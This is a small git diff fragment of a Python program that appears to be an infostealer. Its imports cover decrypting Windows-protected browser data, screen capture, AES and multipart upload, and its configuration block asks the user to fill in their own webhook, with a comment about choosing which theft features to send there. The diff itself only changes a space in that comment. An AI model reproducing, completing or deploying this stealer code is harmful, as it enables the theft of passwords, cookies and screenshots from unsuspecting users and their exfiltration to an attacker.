@@ -21,7 +21,7 @@ from Cryptodome.Cipher import AES
 from PIL import Image, ImageGrab
 from requests_toolbelt.multipart.encoder import MultipartEncoder
 from win32crypt import CryptUnprotectData
-#config - you can setup only features that interesting you to not have a mess at your webhook
+#config -you can setup only features that interesting you to not have a mess at your webhook
 __CONFIG__ = {
     "webhook": "YOUR WEBHOOK HERE",
     "ping": True,
